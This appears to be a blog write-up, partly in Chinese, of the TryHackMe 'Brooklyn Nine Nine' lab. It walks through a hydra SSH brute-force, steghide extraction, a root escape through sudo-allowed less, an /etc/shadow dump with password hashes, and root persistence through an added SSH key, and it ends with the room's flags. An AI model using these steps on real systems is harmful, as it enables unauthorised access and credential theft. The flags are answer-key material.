---
layout: post
title: "Brooklyn Nine Nine"
date: "2023-08-16"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# Brooklyn Nine Nine
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

tag : security, nmap, gobuster, pentest

## Task 1: Deploy and get hacking
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.

Target IP Adress : 10.10.37.100

Kali Linux : 10.18.72.222

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap 10.10.37.100                   
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 03:58 EDT
Nmap scan report for 10.10.37.100
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 45.78 seconds
```

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -sVC -p 21,22,80 10.10.37.100     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-16 04:00 EDT
Nmap scan report for 10.10.37.100
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.72.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.16 seconds
```

```
┌──(root㉿kali)-[~/Downloads]
└─# ftp 10.10.37.100                                  
Connected to 10.10.37.100.
220 (vsFTPd 3.0.3)
Name (10.10.37.100:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32837|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||52559|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |****************************************************************************************************************|   119        1.33 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.32 KiB/s)
ftp> 

```

查看note_to_jake.txt的内容，发现用户Jake可能使用了弱密码。

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

利用hydra暴力破解ssh。得到登录凭据：login: jake   password: 987654321

```
┌──(root㉿kali)-[~/Downloads]
└─# hydra -l jake -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.10.37.100
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-16 04:23:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1009 login tries (l:1/p:1009), ~64 tries per task
[DATA] attacking ssh://10.10.37.100:22/
[22][ssh] host: 10.10.37.100   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-16 04:24:36
```

利用获得的凭据ssh登录目标。

```
[22][ssh] host: 10.10.37.100   login: jake   password: 987654321
```

```
┌──(root㉿kali)-[~/Downloads]
└─# ssh jake@10.10.37.100
jake@10.10.37.100's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ whoami
jake
jake@brookly_nine_nine:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake)
jake@brookly_nine_nine:~$ pwd
/home/jake
jake@brookly_nine_nine:~$ ls -al
total 44
drwxr-xr-x 6 jake jake 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 root root 1349 May 26  2020 .bash_history
-rw-r--r-- 1 jake jake  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr  4  2018 .bashrc
drwx------ 2 jake jake 4096 May 17  2020 .cache
drwx------ 3 jake jake 4096 May 17  2020 .gnupg
-rw------- 1 root root   67 May 26  2020 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26  2020 .local
-rw-r--r-- 1 jake jake  807 Apr  4  2018 .profile
drwx------ 2 jake jake 4096 May 18  2020 .ssh
-rw-r--r-- 1 jake jake    0 May 17  2020 .sudo_as_admin_successful
```

```
jake@brookly_nine_nine:/$ cd /var/www/html
jake@brookly_nine_nine:/var/www/html$ ls -al
total 116
drwxr-xr-x 2 www-data www-data  4096 May 26  2020 .
drwxr-xr-x 3 root     root      4096 May 17  2020 ..
-rw-r--r-- 1 root     root     69685 May 26  2020 brooklyn99.jpg
-rwxr-xr-x 1 www-data www-data   718 May 18  2020 index.html
-rw-r--r-- 1 root     root     30518 May 18  2020 photo.jpg
```

下载brooklyn99.jpg，photo.jpg。

访问：http://10.10.37.100/

源码中有一行注释：

```
<!-- Have you ever heard of steganography? -->
```

在Kali Linux中，你可以使用`steghide`工具来检查图像是否包含隐写术或隐藏信息。`steghide`是一个用于隐藏和提取隐写信息的命令行工具。要检查图像是否包含隐藏的信息，可以按照以下步骤进行：

2. 使用steghide检查图像：
假设你有一个名为`image.jpg`的图像文件，并且想要检查是否有隐藏的信息，可以运行以下命令：

```bash
steghide info image.jpg
```

该命令将输出图像中是否包含隐藏的信息，如果有，它还将显示隐藏信息的一些基本信息，如隐藏数据的大小和加密密码（如果应用了加密）。

请注意，`steghide`只能检测使用`steghide`工具隐藏的信息，而无法检测其他隐写术。如果你怀疑图像中可能使用其他隐写术隐藏信息，可以考虑使用其他专门的隐写检测工具，如`stegdetect`、`stegosuite`等，以便更全面地分析图像。

图像文件应用了加密。

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide info brooklyn99.jpg                         
"brooklyn99.jpg":
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide info photo.jpg                              
"photo.jpg":
  format: jpeg
  capacity: 1.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "note.txt":
    size: 50.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

要查看`note.txt`文件的内容，你需要使用`steghide extract`命令来提取隐藏的文件，并且在提取过程中提供正确的密码（passphrase）。提取后，你可以通过文本编辑器或命令行查看文件的内容。

以下是提取`note.txt`文件的步骤：

1. 提取隐藏文件：
在终端中输入以下命令，并按照提示输入正确的密码（passphrase）：

```bash
steghide extract -sf photo.jpg
```

2. 输入密码：
输入与隐藏信息加密时使用的密码。

3. 查看提取的文件：
提取成功后，`steghide`将把`note.txt`文件保存在当前工作目录中。你可以使用文本编辑器（如`nano`或`vim`）来查看文件内容，或者使用`cat`命令在终端中查看文件内容：

```bash
cat note.txt
```

请注意，如果你没有正确的密码，是无法成功提取和查看隐藏文件的内容的。

```
┌──(root㉿kali)-[~/Downloads]
└─# steghide extract -sf photo.jpg                           
Enter passphrase: 
wrote extracted data to "note.txt".
```

```
┌──(root㉿kali)-[~/Downloads]
└─# cat note.txt 
----------- StillNoob was here ------------------
```

StillNoob是什么？

```
jake@brookly_nine_nine:/var/www/html$ cd /home
jake@brookly_nine_nine:/home$ ls -al
total 20
drwxr-xr-x  5 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
drwxr-xr-x  5 amy  amy  4096 May 18  2020 amy
drwxr-xr-x  6 holt holt 4096 May 26  2020 holt
drwxr-xr-x  6 jake jake 4096 May 26  2020 jake
```

在/home/holt目录下发现user.txt。

```
jake@brookly_nine_nine:/home/amy$ cd ../holt
jake@brookly_nine_nine:/home/holt$ ls -al
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
jake@brookly_nine_nine:/home/holt$ groups holt
holt : holt
```

向/home/jake目录上传LinEnum.sh。

```
┌──(root㉿kali)-[~/Downloads]
└─# scp LinEnum.sh jake@10.10.37.100:/home/jake
jake@10.10.37.100's password: 
LinEnum.sh                                                                                                                 100%   46KB  52.8KB/s   00:00
```

```
jake@brookly_nine_nine:~$ chmod +x LinEnum.sh
jake@brookly_nine_nine:~$ ./LinEnum.sh

### SYSTEM ##############################################
[-] Kernel information:
Linux brookly_nine_nine 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-003) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.4 LTS"
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic


[-] Hostname:
brookly_nine_nine
```

```
[+] We can sudo without supplying a password!
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less


[+] Possible sudo pwnage!
/usr/bin/less
```

```
[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 170760 Dec  1  2017 /bin/less
```

[less](https://gtfobins.github.io/gtfobins/less/)

### .. / less 
Shell 文件写入 文件读取 SUID Sudo
#### Shell
它可用于从受限环境中产生交互式系统 shell 以实现突破。

```
less /etc/profile
!/bin/sh
```

```
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```

```
less /etc/profile
v:shell
```

#### 文件写入
它将数据写入文件，可能用于执行特权写入或在受限文件系统之外写入文件。

```
echo DATA | less
sfile_to_write
q
```

这会调用默认编辑器来编辑文件。该文件必须存在。

```
less file_to_write
v
```

#### 文件读取
它从文件中读取数据，可能用于执行特权读取或泄露受限文件系统之外的文件。

```
less file_to_read
```

当 less 被其他二进制文件用作分页程序来读取不同的文件时，这很有用。

```
less /etc/profile
:e file_to_read
```

#### SUID
如果二进制文件设置了 SUID 位，它不会丢弃提升的特权，可能被滥用来访问文件系统，升级或作为 SUID 后门维护特权访问。如果用于运行 sh -p，请在允许默认 sh shell 以 SUID 特权运行的系统（例如 Debian（<= Stretch））上省略 -p 参数。

此示例创建了二进制文件的本地 SUID 副本并运行它以保持提升的特权。要与现有的 SUID 二进制文件交互，请跳过第一个命令并使用其原始路径运行程序。

```
sudo install -m =xs $(which less) .

./less file_to_read
```

#### Sudo
如果允许通过 sudo 以超级用户身份运行二进制文件，则它不会丢弃提升的特权，并可用于访问文件系统、升级或维护特权访问。

```
sudo less /etc/profile
!/bin/sh
```

Shell

```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ sudo /usr/bin/less /etc/profile
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# pwd
/home/jake
# cd /root
# ls -al
total 32
drwx------  4 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 May 17  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 May 18  2020 .ssh
-rw-r--r--  1 root root  165 May 17  2020 .wget-hsts
-rw-r--r--  1 root root  135 May 18  2020 root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
# cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18399:0:99999:7:::
amy:$6$UKs4AX7L$8Q1ET3/4EDtczkEAde4Bkc9g4ao2v3IRbapkqtNnWaKa7a2UHbYGsAEqBPlAwXVq8LK39IRjPwmocYkkkikrR0:18399:0:99999:7:::
holt:$6$arvDAeLb$qQX5UfC/TdI2GELzcrI88B7aD.3NGI9eGyhIQPNdtFIcTfzNdSrxt212lOdNM./UQ0dInL0ej4UliuHKKQcjk0:18399:0:99999:7:::
ftp:*:18399:0:99999:7:::
jake:$6$sAa2xMd5$/EyF9jL6BNeNEYixHkn86Gcvg8UeVJl7FvjXcJH1InhrwObBcN7qecniXkq.Bq1nFA8YS8HD2uk/jf8Ju7KnW0:18401:0:99999:7:::
# 
```

SUID

```
jake@brookly_nine_nine:~$ id
uid=1000(jake) gid=1000(jake) groups=1000(jake)
jake@brookly_nine_nine:~$ whoami
jake
jake@brookly_nine_nine:~$ /bin/less /etc/shadow
```

Sudo

```
jake@brookly_nine_nine:~$ sudo /usr/bin/less /etc/profile
root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@brookly_nine_nine:~# whoami
root
```

向root用户的.ssh目录写入公钥，实现权限维持：

```
root@brookly_nine_nine:/root/.ssh# pwd
/root/.ssh
root@brookly_nine_nine:/root/.ssh# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVPU5GBfIfH/nULAuQp+HxCfMoJ8M4JjtARUOSsqdXfYXaHeyUpe1iYbuEAkHbTMDa/9WCwR/pzUSYnrbc6p7HFo2dBpU5k//MgleASy+QRMbShkPv13z7doRR/7+zXi1hQYNRfk03kZGd6WLokY2zS7SlXsAmaBleFZi/xaxwQKV4qRkHMEIXF0w2X6Pw+QqKbJFJWIh7krCih7tJd/dvvkyi7CCXeCUUHtjWwHqnP+tN1FeeWqrXNl4/VtpkhgbaqHbECDCQpv7Kj2LvG7ZZzPjYHYdHxj0dUc6rWrLH2ABoguPy5TCsLwVaTGpPmQo9fpfDlkQokeJx+xhiytRjxlgDbfUYvu6TtSxhoZ8Zn4dEwFIKr932ZWMWnVZSDrPJQWGdi9oXeY6vD7CyItb8e0bBP0ERdF55GtZb/12RsUS8WdTYor2oW8XTlHpZCCDltdMnFQMNn/0qYrF6uJpKUCEnF631EKtcYR0dNtXZe/0irYva12vpiZaiMCCE= root@kali" > authorized_keys
```

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh root@10.10.37.100                      
root@brookly_nine_nine:~# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@brookly_nine_nine:~# id
uid=0(root) gid=0(root) groups=0(root)
root@brookly_nine_nine:~# whoami
root
root@brookly_nine_nine:~# pwd
/root
```

### Answer the questions below
User flag

ee11cbb19052e40b07aac0ca060c23ee

Root flag

63a9f0ea7bb98050796b649e85481845